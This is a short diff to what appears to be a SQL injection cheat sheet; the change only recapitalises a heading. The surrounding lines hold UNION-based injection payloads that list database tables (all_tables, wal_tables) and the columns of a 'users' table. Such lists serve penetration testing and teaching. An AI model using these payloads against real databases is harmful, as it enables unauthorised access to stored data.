@@ -43,7 +43,7 @@
         1' union SELECT table_name,2,3,4,5,6,7,null from all_tables()--'    #get all none WAL tables
         1' union SELECT name,2,3,4,5,6,7,null from wal_tables()--'          #get all WAL tables
 
-## Get columns Name for table:
+## Get columns name for table:
 
         1' union SELECT column,2,3,4,5,6,7,null from table_columns('users')--'                   #get error table and column names that are SQL keywords
         1' union SELECT "column",2,3,4,5,6,7,null from table_columns('users')--'                 #success
